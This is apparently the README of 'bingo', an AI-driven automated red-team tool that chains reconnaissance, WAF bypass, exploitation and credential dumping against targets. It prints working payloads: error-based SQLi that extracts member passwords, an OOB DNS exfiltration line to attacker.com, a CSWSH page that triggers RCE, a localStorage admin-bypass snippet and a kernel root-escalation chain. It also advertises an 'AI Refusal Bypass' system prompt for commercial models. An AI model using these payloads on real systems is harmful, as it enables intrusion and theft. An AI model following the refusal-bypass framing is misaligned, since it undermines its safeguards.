| XML / sitemap endpoints | `nokogiri` / libxml2 | **HIGH** — XML parser with DTD support |
| MessagePack binary endpoints | `msgpack-ruby C extension` | **HIGH** — binary protocol |
| Protobuf endpoints | `google-protobuf C extension` | **HIGH** — binary protocol |
| File upload + image processing | `RMagick` / `MiniMagick` / ImageMagick | **HIGH** — image format parser |
| YAML deserialization endpoints | `Psych C extension` | **HIGH** — unsafe object deserialization risk |
| Form / URL-encoded data | `Rack` / URI C parser | **MEDIUM** |

#### AI Auto-Trigger Conditions

The module activates automatically when bingo's AI detects:

- `Server:` header contains `Passenger`, `Puma`, `Unicorn`, `Thin`, or `WEBrick`
- `X-Powered-By:` header contains `Phusion Passenger` or `Rack`
- Response cookies contain `_session_id` or `rack.session`
- Response body contains Ruby stack traces (`ActionController::`, `ActiveRecord::`, `.rb:` paths)
- URL matches known Ruby CMS patterns: `redmine`, `gitlab`, `discourse`, `spree`, `solidus`, `refinery`
- `raw_findings` from earlier phases contain Ruby framework keywords

#### Generated Ruzzy + LibAFL Harness Examples

bingo automatically generates harness templates for discovered surfaces:

**GraphQL (libgraphqlparser C extension):**
```ruby
# FUZZER_NO_MAIN_LIB=/usr/lib/libFuzzer.a LD=lld ruzzy fuzz harness.rb
require 'graphql'   # pre-require BEFORE fuzz() — registers .preinit_array coverage map

Ruzzy.fuzz do |data|
  begin
    GraphQL.parse(data.to_s)
  rescue GraphQL::ParseError
    # expected parse errors — only crashes matter
  end
end
```

**Nokogiri XML (libxml2 C extension):**
```ruby
require 'nokogiri'

Ruzzy.fuzz do |data|
  begin
    Nokogiri::XML(data.to_s) { |c| c.strict }
  rescue Nokogiri::XML::SyntaxError
  end
end
```

**YAML unsafe load risk detection:**
```ruby
# Risk: Psych.load enables Ruby object deserialization → RCE via !!ruby/object
# Detection payload:
# --- !!ruby/object:Gem::Installer 'a'
require 'psych'

Ruzzy.fuzz do |data|
  begin
    Psych.safe_load(data.to_s)   # use safe_load in production!
  rescue Psych::SyntaxError
  end
end
```

#### Evidence Levels

| Level | Meaning |
|-------|---------|
| `VERIFIED` | Ruby framework confirmed + C extension parser endpoint responded 200/201 + version leaked |
| `LIKELY` | Ruby framework confirmed + parser endpoints found (no version confirmation) |
| `INFERRED` | Ruby HTTP headers detected, no parser surface confirmed |
| `AI_ANALYSIS` | Response patterns suggest Ruby, no definitive HTTP-level confirmation |

#### Key Takeaway: LibAFL vs. libFuzzer

- **libFuzzer** (LLVM): In maintenance mode as of 2025, expects coverage maps lazily
- **LibAFL** (Rust-based): Actively maintained, better performance, expects all coverage maps registered at startup via `.preinit_array`
- **Migration requirement**: Switch to `lld` linker; pre-require all C extensions before `Ruzzy.fuzz {}`

#### Quick Remediation

```bash
# 1. Set YAML to always use safe_load
grep -r "YAML.load\b" app/ lib/   # find unsafe calls
# Replace: YAML.load → YAML.safe_load

# 2. Enable Brakeman SAST for Ruby
gem install brakeman
brakeman --run-all-checks

# 3. Update vulnerable gems
bundle audit check --update
bundle update nokogiri oj graphql msgpack google-protobuf

# 4. Run Ruzzy+LibAFL with lld
FUZZER_NO_MAIN_LIB=/usr/lib/libFuzzer.a LD=lld bundle exec ruzzy fuzz harness.rb

# 5. Remove framework version from headers (Rails)
# config/application.rb
config.action_dispatch.default_headers = { 'Server' => 'nginx' }
```

---

### Copy Fail LPE — CVE-2026-31431 Linux Kernel Local Privilege Escalation + Container Escape (v2.1)

> **Research basis:**  
> Xint Code Research Team — Juno Im (@junorouse) & Taeyang Lee of Theori  
> ["Copy Fail: 732 Bytes to Root on Every Major Linux Distribution"](https://xint.io/blog/copy-fail-linux-distributions)  
> Published: April 29, 2026 | CVE assigned: April 22, 2026  
> **Skill module:** `CopyFailLPE` (id: 53)

#### What the vulnerability is

A **logic bug in the Linux kernel's `authencesn` cryptographic template** allows any unprivileged local user to perform a **controlled 4-byte write into the kernel page cache of any readable file** — including SUID binaries like `/usr/bin/su`. By chaining four write primitives of 4 bytes each, an attacker overwrites the in-memory copy of a setuid binary with shellcode. When the binary is next executed, the page cache version runs: **instant root** without file-system traces.

Three commits over a decade created the conditions:

| Year | Commit | Effect |
|------|--------|--------|
| 2011 | authencesn added | uses dst scatterlist as ESN scratch space |
| 2015 | AF_ALG AEAD interface | assoclen+cryptlen byte offset past output |
| 2017 | algif_aead in-place optimization | `req->src = req->dst` — page-cache pages now writable |

**Attack chain (732 bytes of Python 3.10+):**
```
AF_ALG socket (authencesn) → splice() target SUID binary into TX scatterlist
→ sendmsg() AAD bytes[4:7] = desired 4-byte shellcode chunk (seqno_lo)
→ recvmsg() → HMAC fails, 4-byte write persists in page cache
→ Repeat per chunk → execve("/usr/bin/su") → root
```

**Why it's stealthy:**
- On-disk file unchanged — SHA256/MD5 file integrity checks **miss** the modification
- Page cache is **host-wide** — works across container and K8s boundaries
- No race condition, no recompile, no crash-prone timing window

#### Affected systems

| Distribution | Vulnerable kernel | Patched kernel |
|---|---|---|
| Ubuntu (tested) | 6.17.0-1007-aws | ≥ 6.17.0-1008 |
| Amazon Linux 2023 | 6.18.8-9 | ≥ 6.18.8-10 |
| RHEL 10.1 | 6.12.0-124 | ≥ 6.12.0-125 |
| SUSE 16 | 6.12.0-160000 | ≥ 6.12.0-160001 |

Broad vulnerable range: **Linux 4.9 (2017 in-place optimization) through distro patch date (2026-04-01)**.

#### What bingo detects

| Detection method | Evidence level |
|---|---|
| Kernel version leaked in HTTP headers (`Server`, `X-Powered-By`) | `LIKELY` |
| `/proc/version` direct path exposure | `VERIFIED` |
| Webshell `uname -r` output in vulnerable range | `VERIFIED` |
| `lsmod \| grep algif_aead` confirms module loaded | `VERIFIED` |
| Python 3.10+ available (PoC can run directly) | `VERIFIED` |
| Container/K8s cgroup markers → host escape path | `VERIFIED` |
| Linux OS hint in headers (no version) | `AI_ANALYSIS` |

#### AI auto-trigger conditions

bingo activates `CopyFailLPE` when **any** of:
- RCE / webshell was confirmed in earlier phase (`result.webshell_uploaded = True`)
- `raw_findings` contains `rce`, `webshell`, `upload`, `command_exec`, or `lfi`
- HTTP response headers contain Linux distribution signatures
- Any header value matches `Linux/x.y` kernel version pattern
- URL path suggests Linux-hosted CMS (gnuboard, WordPress, Drupal, XE, Rhymix)

#### Container escape (Part 2)

Because the Linux page cache is **shared across the host**, a webshell inside a Docker container or K8s pod can run the PoC to overwrite a SUID binary on the **host** node, then escalate to host root outside the container boundary. bingo flags `container_escape_possible = True` when both `kernel_vulnerable` and `container_environment` are `True`.

#### Quick remediation

```bash
# Immediate: disable algif_aead module
sudo rmmod algif_aead
echo 'install algif_aead /bin/false' | sudo tee /etc/modprobe.d/disable-algif-aead.conf
sudo dracut -f  # regenerate initramfs

# Audit AF_ALG socket usage
ss -xlp | grep AF_ALG
auditctl -a always,exit -F arch=b64 -S socket -F a0=38 -k af_alg_socket_call

# Permanent fix: patch kernel (distro-specific)
apt-get upgrade linux-image-$(uname -r)   # Ubuntu
yum update kernel                          # Amazon Linux / RHEL
zypper patch                               # SUSE
```

**Note:** On-disk integrity tools (AIDE, Tripwire, sha256sum) will **not** detect this attack because only the page cache is modified. Runtime memory integrity monitoring or kernel patching is required.

---

### Advanced SQLi Exploit — EXTRACTVALUE Error-Based + Second-Order SQLi (v2.1)

> **Research basis:**  
> [Intigriti — "Exploiting SQL Injection Vulnerabilities: Advanced Exploitation Guide"](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-sql-injection-sqli-vulnerabilities)  
> Published: April 30, 2026 (Updated June 10, 2026) — Author: Ayoub, Intigriti Senior Security Content Developer  
> **Skill module:** `AdvancedSQLiExploit` (id: 52)

#### New techniques beyond standard SQLi automation

Two advanced exploitation techniques not covered by standard `sqlmap` delegation:

**① EXTRACTVALUE Error-Based Exfiltration**

Forces MySQL to throw an XPATH syntax error containing subquery output:

```sql
-- Extract current database name via error message
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))

-- Extract credentials from Korean CMS member table
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(mb_id,0x3a,mb_password) FROM g5_member LIMIT 1)))

-- CAST overflow fallback (when EXTRACTVALUE is filtered)
1 AND EXP(~(SELECT * FROM (SELECT database()) x))
```

Response contains: `XPATH syntax error: '~target_database_name'` — direct data exfiltration without UNION or reflection.

**② Second-Order (Stored) SQLi Detection**

Input passes initial sanitization and is stored safely, but fires in a deferred async context:

```
Step 1: Store malicious payload in note/username/profile field
         content = "test' AND SLEEP(7)-- -"

Step 2: Trigger async action (email notification / scheduled reminder / export / report)

Step 3: Measure time-gap between scheduled execution time and actual response
         → 7-second delay in background job confirms second-order SQLi
```

**③ OOB DNS Exfiltration via LOAD_FILE**

```sql
-- Exfiltrate data via DNS lookup to attacker-controlled domain
(SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\x')))
```

#### Attack Surface Coverage

| Target | Parameters Tested |
|--------|------------------|
| `/bbs/board.php` | `bo_table`, `wr_id` |
| `/shop/item.php` | `it_id` |
| `/product/view.php` | `idx` |
| `/board/view.php` | `idx` |
| URL query string | All `?key=val` parameters |

#### AI Auto-Trigger Conditions

```python
# Activate AdvancedSQLiExploit when:
sqli_vulnerable == True          # prior SQLi scan confirmed injectable parameter
OR parsed.query != ""            # URL contains query string parameters
OR "board.php"/"view.php" in URL # Korean CMS CMS URL pattern detected
OR "sqli"/"inject" in raw_findings  # SQLi indicators from prior scans
```

#### Second-Order Async Context Detection

Automatically flags pages containing these indicators as potential second-order surfaces:
`reminder` · `notification` · `scheduled` · `background job` · `email send` · `export` · `report` · `queue` · `batch` · `cron` · `task` · `async`

#### EXTRACTVALUE Error Pattern Matched

```
XPATH syntax error: '~<extracted_value>'
```

Regex: `XPATH syntax error.*?'~([^'<]{1,200})'`

#### Evidence Levels

| Finding Type | Evidence Level | Condition |
|---|---|---|
| `error_based_extractvalue` | `VERIFIED` | XPATH error contains extracted data |
| `time_based` | `LIKELY` | Response delay ≥ 85% of SLEEP() value |
| `second_order` | `INFERRED` | Async contexts found in HTML |
| `oob_dns` | `VERIFIED` | DNS callback received |

#### Remediation

1. **All SQL queries** → Prepared Statements / Parameterized Queries mandatory
2. **Error messages** → `display_errors=Off`; never expose XPATH/DB errors to client
3. **Second-order paths** → Treat DB-retrieved data as untrusted when reused in queries
4. **EXTRACTVALUE/SLEEP** → WAF rules blocking `EXTRACTVALUE`, `CONCAT(0x7e`, `SLEEP(`
5. **LOAD_FILE** → `REVOKE FILE ON *.* FROM 'user'@'host'`; DB server egress filtering
6. **Async jobs** → Security audit all background job / cron / email-trigger code paths

---

### Cloud Token Recon — Grafana → GCP Token → 507 Private Repos Chain (v2.1)

> **Research basis:**  
> [Sectricity Security Team — "From a Misconfigured Grafana to 507 Private Meta Repos: A Bug Worth $157K"](https://sectricity.com/blog/misconfigured-grafana-507-private-meta-repos/)  
> Published: May 28, 2026 — **$157,000 bounty** awarded by Meta (filed March 21, mitigated March 23, 2026)  
> **Skill module:** `CloudTokenRecon` (id: 51)

**Key insight:**

A boring open Grafana on a public Meta IP became a 5-hop chain into **507 private Meta repositories** with read/write access. The pivot was not the Grafana content itself — it was the anomaly of its existence. The TLS wildcard SAN on the same IP revealed a hidden shadow domain estate, JS bundles on those domains referenced an undocumented internal API domain, and AI-generated context-aware fuzzing against that domain hit an **unauthenticated GCP token endpoint** — handing out a cloud credential that cascaded through Secret Manager → Vercel → GitHub PATs.

**Attack Chain:**

```
① Open dev tool (Grafana/Prometheus/Kibana) found on public IP
② TLS certificate SAN wildcard → shadow subdomain estate (crt.sh)
③ JS bundle parsing across shadow domains → hidden domain reference discovered
④ Context-aware fuzzing → /_api/gcp-token returns GCP OAuth2 token (no auth)
⑤ GCP token → Secret Manager → Vercel token → 85 env vars → GitHub PATs
⑥ GitHub PATs → 507 private repos with read/write access
```

**Chain table:**

| Hop | Asset Gained | Method |
|-----|-------------|--------|
| 1 | Open dev tool | Public IP scan |
| 2 | Shadow subdomains | TLS SAN wildcard + crt.sh |
| 3 | Hidden internal domain | JS bundle parsing |
| 4 | GCP OAuth2 token | Unauthenticated endpoint fuzz |
| 5 | GitHub PATs | GCP → Secret Manager → Vercel |
| 6 | 507 private repos | GitHub token enumeration |

**AI auto-trigger conditions:**

| Condition | Trigger |
|-----------|---------|
| Target URL contains cloud keywords (aws/gcp/azure/k8s/llm/ai) | ✅ Auto |
| Target URL contains dev tool keywords (grafana/prometheus/jenkins) | ✅ Auto |
| HTTPS target (TLS SAN extraction always valuable) | ✅ Auto |
| HTTP-only target with no cloud indicators | ⏭ Skip |

**What bingo detects:**

| Finding type | Evidence level | Severity |
|-------------|---------------|---------|
| `open_dev_tool` | VERIFIED | Medium |
| `tls_san_wildcard` | VERIFIED | Info |
| `js_hidden_domain` | INFERRED | Low |
| `cloud_token_exposed` | VERIFIED | **Critical** |
| `shadow_domain_token_exposed` | VERIFIED | **Critical** |
| `likely_cloud_chain` | AI_ANALYSIS | High |

**Supported unauthenticated token endpoint patterns:**

```
/_api/gcp-token          /api/gcp-token        /_api/token
/_aws/credentials        /api/aws-token        /api/azure-token
/api/env                 /api/config           /.env
/config.json             /secrets              /debug/token
```

**Token type auto-identification:**

- `gcp_access_token` — GCP OAuth2 `access_token` JSON field
- `aws_access_key` — `ASIA` / `AKIA` prefix AWS credentials
- `github_token` — `ghp_` / `github_pat_` prefix
- `jwt_token` — 3-part dot-separated base64url
- `api_key_generic` — JSON keys named `api_key`, `secret`, `token`

**Remediation:**

1. Require authentication on all internal dev tools (Grafana, Prometheus, Kibana, Jenkins)
2. Never expose internal monitoring services to the public internet — enforce VPN / IP allowlist
3. Minimize TLS wildcard SAN scope; monitor crt.sh for unexpected subdomains
4. Remove internal domain references from production JS bundles — use environment variables
5. Apply IMDSv2 / iptables to block direct cloud metadata access (169.254.169.254)
6. Immediately rotate all exposed cloud credentials (GCP SA → Vercel → GitHub PATs)
7. Enforce least-privilege on service accounts — no full Secret Manager read access

---

### Web Cache Deception + SameSite Lax Bypass (v2.1)

> **Research basis:**  
> [Clement Osei-Somuah (tinopreter) — "Cracking SameSite for a $2,000 Web Cache Deception"](https://medium.com/@tinopreter/cracking-samesite-for-a-2-000-web-cache-deception-746972278412)  
> Published: May 29, 2026 — $2,000 bounty on HackerOne  
> **Skill module:** `WebCacheDeception` (id: 50)

**Key insight:**

Web Cache Deception (WCD) tricks a CDN or reverse proxy into caching a page containing **user-specific sensitive data** (JWT, PII, session token), then an attacker retrieves the cached response without authentication.

The classic attack requires the victim's browser to send their **session cookie** to the target — normally blocked by `SameSite=Lax`. The bypass: use `<meta http-equiv="refresh">` on an attacker-hosted page, which the browser treats as a **top-level navigation**. `SameSite=Lax` cookies **are** sent on top-level navigation by design.

**Attack chain:**

```
① Attacker identifies a page with:
   - No Cache-Control: private / no-store
   - X-Cache / CF-Cache-Status / Age header → CDN active
   - Sensitive data in response (JWT, email, user ID)

② Attacker crafts a unique cache-buster URL:
   https://target.com/profile?cb=ATTACKER_UNIQUE

③ Attacker-hosted page delivers meta-refresh:
   <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=ATTACKER_UNIQUE">
   ↳ Browser performs top-level navigation → SameSite=Lax cookies included

④ Victim visits attacker's page (1-click or embedded):
   - Victim's authenticated response cached at target.com/profile?cb=ATTACKER_UNIQUE

⑤ Attacker fetches same URL (no auth):
   curl https://target.com/profile?cb=ATTACKER_UNIQUE
   ↳ Gets victim's cached response containing JWT/session token

⑥ Attacker uses stolen JWT to impersonate victim → Account Takeover
```

**SameSite bypass detail:**

| Request type | SameSite=Lax | SameSite=Strict |
|---|---|---|
| `<img src=...>` (subresource) | ❌ Blocked | ❌ Blocked |
| `fetch()` / XHR (AJAX) | ❌ Blocked | ❌ Blocked |
| `<a href=...>` link click | ✅ Allowed | ❌ Blocked |
| `<meta http-equiv="refresh">` | ✅ **Allowed** ← bypass | ❌ Blocked |
| Browser address bar navigation | ✅ Allowed | ❌ Blocked |

**`<meta http-equiv="refresh">` = top-level navigation → SameSite=Lax cookies are sent**

**AI auto-trigger conditions** (bingo activates automatically):

| Condition | Detection method |
|---|---|
| `X-Cache`, `CF-Cache-Status`, `Age` header present | HTTP response header analysis |
| CDN keywords in headers (`cloudflare`, `fastly`, `varnish`) | Header fingerprinting |
| Cache-Control missing `private` or `no-store` | Header analysis |
| Web target (any `http://` or `https://`) | Default attempt for all web targets |

**Cache confirmation test** (MISS → HIT):

```bash
# First request (MISS expected):
curl -I "https://target.com/profile?cb=abc123"
# X-Cache: MISS

# Wait 1 second, same URL:
curl -I "https://target.com/profile?cb=abc123"
# X-Cache: HIT  ← caching confirmed
```

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---|---|---|
| `cache_header_detected` | `VERIFIED` (response header) | Info |
| `cacheable_without_private` | `VERIFIED` (header analysis) | Medium |
| `sensitive_data_in_cache` | `VERIFIED` (body analysis: JWT/token/email found) | High |
| `cache_confirmed_miss_to_hit` | `VERIFIED` (two-request confirmation) | High |
| `samesite_lax_bypass_possible` | `VERIFIED` (cookie attribute) | High |
| `wcd_exploitable` | `VERIFIED` (all conditions confirmed) | Critical |
| `wcd_likely` | `LIKELY` (cache confirmed, manual auth test needed) | High |
| `sensitive_path_cacheable` | `LIKELY` (/profile /settings /dashboard) | High |

**Auto-generated PoC HTML:**

```html
<!DOCTYPE html>
<html>
<head>
    <!-- SameSite=Lax Bypass: meta-refresh = Top-Level Navigation
         Browser includes Lax cookies on top-level navigation by spec -->
    <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=UNIQUE">
</head>
<body>
    <h3>Loading...</h3>
    <!-- Fallback anchor -->
    <a href="https://target.com/profile?cb=UNIQUE">Click here</a>
</body>
</html>
```

**Requirements:**

1. Target page served through CDN/caching proxy (Cloudflare, Fastly, Varnish, Nginx, etc.)
2. Page lacks `Cache-Control: private` or `no-store`
3. Sensitive data (JWT, session, PII) present in response body
4. `SameSite=Lax` or unset (browser default) — does NOT work with `SameSite=Strict`

**Remediation (auto-included in report):**
1. **Add `Cache-Control: no-store, private`** to all authenticated/user-specific responses
2. **Upgrade `SameSite=Strict`** on session cookies — prevents all cross-site cookie delivery
3. **Purge CDN cache** immediately for affected paths
4. **Configure CDN to never cache** paths with `Set-Cookie` in response headers
5. **Add `Vary: Cookie`** header to ensure per-user cache separation
6. **Automated cache header CI check** — flag any authenticated endpoint missing `private`

---

### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)

> **Research basis:**  
> [Yashar Shahinzadeh / Voorivex Team — "First RCE via Reverse Engineering with AI"](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai)  
> Similar prior art: Tavis Ormandy (Electrum WebSocket RCE, 2018)

**Attack chain:**

```
① EXE download path extracted from JS → file accessible without auth
② JS contains ws://127.0.0.1:PORT → desktop app runs local WebSocket server
③ WebSocket has no Origin header validation → CSWSH (Cross-Site WebSocket Hijacking)
④ WebSocket exposes RCE gadget: {RUN: "DRIVE", URL: "calc.exe"}
    └── Service falls through to explorer.exe ShellExecute → OS-level code execution
⑤ Zero-click: victim visits attacker page → instant RCE
```

**AI auto-trigger conditions** (bingo runs this scan automatically):

| Condition | Detection method |
|-----------|-----------------|
| `ws://127.0.0.1:PORT` in JS files | JS static analysis |
| EXE download function in JS (`downSetup`, `down=service`) | Regex pattern match |
| `Content-Type: application/octet-stream` response | HTTP probe |
| `download/setup/install` JS functions | Keyword scan |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `js_exe_download` | `LIKELY` | Medium |
| `js_localhost_websocket` | `LIKELY` | High |
| `cswsh_port_open` | `VERIFIED` (TCP connect) | Critical |
| `exe_exposed` | `VERIFIED` (HTTP 200 + octet-stream) | High |
| `cswsh_rce_chain` | `LIKELY`/`VERIFIED` | Critical |

**Auto-generated PoC:**

```html
<!-- CSWSH PoC — victim opens this page → RCE triggers automatically -->
<script>
var ws = new WebSocket('ws://127.0.0.1:PORT');
ws.onopen = function() {
  ws.send(JSON.stringify({GET: 'VERSION'}));             // confirm service
  ws.send(JSON.stringify({RUN: 'DRIVE', URL: 'calc.exe'})); // RCE gadget
};
</script>
```

> **Note (Zero-Hallucination):**  
> Server-side scanners cannot connect to `ws://127.0.0.1` — JS pattern detection is `LIKELY`.  
> TCP port open = `VERIFIED`. Browser-based PoC required for final confirmation.

**Remediation (auto-included in report):**
1. Implement Origin header validation in localhost WebSocket server — whitelist approach
2. Remove file/process execution methods from WebSocket API (`RUN/DRIVE`, `RUN/APP`)
3. Add authentication token requirement to WebSocket handshake
4. Require authentication for EXE download endpoints (signed URLs or session check)
5. Replace `explorer.exe` ShellExecute fallback with strict path whitelist

---

### ACPV — Client-Side Authentication Bypass (v2.1)

bingo automatically detects and exploits client-side authentication vulnerabilities — no password needed.

**How it works:**

Many sites store authentication state in the browser (`localStorage`, `sessionStorage`) and never verify it server-side. bingo finds and exploits this pattern automatically.

| Step | What bingo does |
|------|----------------|
| 1 | Collects all JS files from the target and scans for auth-related patterns (`isLoggedIn`, `token`, `userRole`, etc.) |
| 2 | Tests API endpoints without any cookies or tokens — if the server responds 200, it's an unauthenticated API |
| 3 | Identifies Burp Suite response manipulation points (`"isActive":false`, `"role":"user"`, etc.) |
| 4 | Auto-generates browser console PoC — paste and run, no tools needed |

**Example PoC output:**
```javascript
// bingo auto-generated PoC — paste into browser DevTools console
localStorage.setItem('isLoggedIn', 'true');
localStorage.setItem('userRole', 'admin');
localStorage.setItem('token', 'bypass_acpv');
location.reload();
```

**AI auto-trigger conditions:**
- Admin login fails (no password → try client-side bypass)
- No SQLi vulnerability found (pivot to client-side attack)
- React / Vue / Angular site detected (JS-heavy apps are most vulnerable)

**Zero-Hallucination:** Actual HTTP responses are labeled `VERIFIED`. Pattern matches without server confirmation are labeled `LIKELY`. Nothing is fabricated.

---

### IDOR / Authorization Bypass Phase

Based on real-world exploitation experience:

- Scans for insecure direct object references (`?id=`, `?no=`, `?user_id=`)
- Detects PII exposure (resident number, bank account, phone numbers)
- Checks for unauthenticated admin panel access
- Probes `phpinfo()` and sensitive file exposure
- **IDOR-based password reset** — resets credentials via vulnerable endpoints and verifies actual login success
- All findings tagged with evidence level

---

### Hash Cracking — Fully Automated

When password hashes appear in AI responses, bingo automatically triggers a crack pipeline:

**Step 1 — Online Lookup** (fast, no GPU needed):

| Site | Notes |
|------|-------|
| CrackStation | Largest free DB |
| hashes.com | Multi-algorithm |
| md5decrypt.net | MD5 specialist |
| nivaura.com | SHA-1 / MD5 |
| cmd5.org | Asia-friendly |

**Step 2 — Offline Crack** (if online fails):
- `john` (John the Ripper)
- `hashcat` (GPU-accelerated, bcrypt)
- Python wordlist engine (rockyou.txt auto-detected)

Supported: `bcrypt`, `MD5`, `SHA-1`, `SHA-256`, `SHA-512`, `NTLM`, `MySQL41`

---

### External Tool Auto-Install & Python Fallback

bingo manages all external tools automatically — no manual setup required.

**Tool execution priority:**

| Step | Action |
|------|--------|
| 1 | Use `~/.bingo/tools/` or system PATH |
| 2 | **Auto-install** (GitHub Releases / brew / apt) |
| 3 | **AI-generated Python** — AI writes the tool itself; workflow never stops |

**Go binary tools** (auto-downloaded from GitHub Releases → `~/.bingo/tools/`):

| Tool | Purpose |
|------|---------|
| `nuclei` | Vulnerability scanning |
| `httpx` | HTTP probing & tech detection |
| `ffuf` | Directory & parameter fuzzing |
| `gobuster` | Directory brute-force |
| `subfinder` | Subdomain enumeration |
| `amass` | Attack surface mapping |

**Package manager tools** (brew / apt / yum auto-install):

| Tool | Purpose | Fallback |
|------|---------|---------|
| `nmap` | Port scan | AI writes Python socket scan |
| `nikto` | Web vuln scan | AI writes Python vuln check |
| `whatweb` | Tech fingerprint | bingo http_probe |

---

### Session Auto-Save

Every chat session is automatically saved to:
```
~/.config/bingo/sessions/session_YYYYMMDD_HHMMSS.md
```
Full AI responses, commands, and results are logged in real time.

---

### Skill Engine

220+ red team skills across 41 modules — automatically injected into AI context based on your input. Use `/skill <keyword>` to search.

**Modules include:** Reconnaissance, Exploitation, Privilege Escalation, Post-Exploitation, Lateral Movement, Persistence, Cloud Security, Mobile Security, LLM/AI Security, Blockchain/Web3, Ransomware Defense, **Client-Side Auth Bypass (ACPV)**, **API Discovery & AI Fuzzing**, **MSSQL 2025 AI Exploitation**, and more.

---

### AI Refusal Bypass

All models (DeepSeek, Claude, GPT, GLM) are guided by a proprietary universal system prompt that enforces:
- Structured task execution with semantic delimiters
- OODA-loop decision making (Observe → Orient → Decide → Act)
- Anti-laziness enforcement — explicit evidence required at every step
- 5-phase red team pipeline with intel accumulation and coverage tracking

---

## Commands

Type `/` in chat to open an interactive command menu (arrow keys to navigate).

| Command | Description |
|---------|-------------|
| `/scan <url>` | Full red team pipeline: WAF + fingerprint + vuln + report |
| `/waf <url>` | AI-driven WAF detection + bypass |
| `/crack [hash]` | Hash crack — online lookup → offline crack |
| `/stop` | Stop running crack / scan |
| `/tools` | Show all tools + auto-install missing ones |
| `/tools install <name>` | Install a specific tool automatically |
| `/tools install all` | Install all missing tools at once |
| `/model` | Add or switch AI model |
| `/skill <keyword>` | Search 220+ skill knowledge base |
| `/history` | View conversation history |
| `/export` | Save conversation as `.md` file |
| `/config` | View current settings |
| `/lang` | Change language (ko / zh / en) |
| `/clear` | Clear screen |
| `/quit` | Exit |

### `/tools` Usage

```bash
/tools                       # Show all tools — installed / missing / type
/tools install nmap          # Auto-install nmap via brew/apt
/tools install nuclei ffuf   # Auto-install multiple tools from GitHub Releases
/tools install all           # Auto-install every missing tool at once
```

### `/crack` Usage

```bash
/crack                             # Auto-extract hashes from last AI response
/crack $2y$10$Eix...               # Crack a specific hash
/crack -w ~/Downloads/rockyou.txt  # Use custom wordlist
```

### `bingo scan` Full Pipeline

```bash
bingo scan https://target.com
```

Runs the full 5-phase red team pipeline:
1. **Recon** — tech fingerprint, WAF detection, endpoint mapping
2. **Collect** — sensitive files, admin panels, parameter discovery
3. **Test** — SQLi, LFI, XSS, SSRF, IDOR probing (AI writes Python probes)
4. **Exploit** — WAF bypass + data extraction + credential dump
5. **Report** — auto-generated markdown report with evidence levels

---

## Supported Models

| Provider | Default Model | API |
|----------|--------------|-----|
| **DeepSeek** | `deepseek-chat` | [platform.deepseek.com](https://platform.deepseek.com) |
| **Anthropic Claude** | `claude-opus-4-5` | [console.anthropic.com](https://console.anthropic.com) |
| **OpenAI GPT** | `gpt-4o` | [platform.openai.com](https://platform.openai.com) |
| **Zhipu GLM** | `glm-4` | [open.bigmodel.cn](https://open.bigmodel.cn) |
| **Alibaba Qwen** | `qwen-turbo` | [dashscope.aliyuncs.com](https://dashscope.aliyuncs.com) |
| **Ollama** (local) | `llama3` | [ollama.com](https://ollama.com) |
| **Custom** | — | Enter Base URL manually |

Switch models anytime with `/model`.

---

## Languages

| Language | Code |
|----------|------|
| 한국어 | `ko` |
| 中文 | `zh` |
| English | `en` |

---

## Data Storage

| Data | Location | Trigger |
|------|----------|---------|
| Chat sessions | `~/.config/bingo/sessions/session_*.md` | Auto (real-time) |
| Scan reports | `targets/report_<domain>.md` | Auto on `bingo scan` |
| Command history | `~/.config/bingo/history` | Auto |
| Manual export | `./bingo_chat_<timestamp>.md` | `/export` command |
| Config | `~/.config/bingo/config.json` | Auto |
| Go tools | `~/.bingo/tools/` | Auto on first use |

---

## Config File Location

| OS | Path |
|----|------|
| macOS | `~/Library/Application Support/bingo/config.json` |
| Linux | `~/.config/bingo/config.json` |
| Windows | `%APPDATA%\bingo\config.json` |

---

## Project Structure

```
bingo/
├── bingo/
│   ├── cli.py                    # Entry point + onboarding
│   ├── config.py                 # Settings (cross-platform)
│   ├── models/
│   │   ├── base.py               # Streaming HTTP (OpenAI-compatible + Claude)
│   │   ├── registry.py           # Provider registry
│   │   └── system_prompt.py      # Universal pentest system prompt
│   ├── tools/
│   │   ├── registry.py           # Tool detection (~/.bingo/tools/ + PATH + vendor)
│   │   ├── executor.py           # 4-step: vendor → PATH → auto-install → Python fallback
│   │   ├── downloader.py         # Go binary auto-download from GitHub Releases
│   │   ├── installer.py          # brew / apt / pip auto-install
│   │   ├── http_probe.py         # HTTP fingerprinting
│   │   ├── hash_crack.py         # Offline hash cracker (bcrypt/MD5/SHA/NTLM)
│   │   ├── hash_lookup.py        # Online hash lookup (CrackStation, hashes.com, etc.)
│   │   └── idor_scanner.py       # IDOR/auth-bypass scanner + password reset
│   ├── redteam/
│   │   ├── session.py            # Red team session state + evidence-level tagging
│   │   └── phases/               # 9-phase pipeline (recon → report)
│   ├── core/
│   │   └── anti_hallucination.py # Zero-Hallucination engine (VERIFIED/LIKELY/INFERRED)
│   ├── skills/
│   │   └── engine.py             # 220+ skills across 39 modules (ko/zh/en)
│   ├── ui/
│   │   └── terminal.py           # Interactive terminal (slash menu, live stream, post-report actions)
│   └── lang/
│       └── strings.py            # Multi-language string registry
├── install.sh                    # macOS/Linux installer
├── install.ps1                   # Windows installer
└── pyproject.toml
```

---

### AI-Generated Code Security Surface Detection — AICodeSecSurface (v2.1)

> **Research basis:**  
> Rachel Benson (ProjectDiscovery)  
> ["The Trust Gap Behind the AI Coding Boom: What 200 Security Practitioners Just Told Us"](https://projectdiscovery.io/blog/the-trust-gap-behind-the-ai-coding-boom-what-200-security-practitioners-just-told-us)  
> Published: April 28, 2026 | 200 practitioners surveyed (North America + Western Europe)  
> **Skill module:** `AICodeSecSurface` (id: 55)

#### Survey Context: Why AI Code Creates Security Debt

| Metric | Finding |
|--------|---------|
| % reporting faster delivery in 12 months | **100%** |
| Credit most/all speed lift to AI coding | **49%** |
| Security teams "comfortably keeping up" | **38%** |
| Security work week spent on manual validation | **66%** |
| Report secrets exposure increased | **78%** |
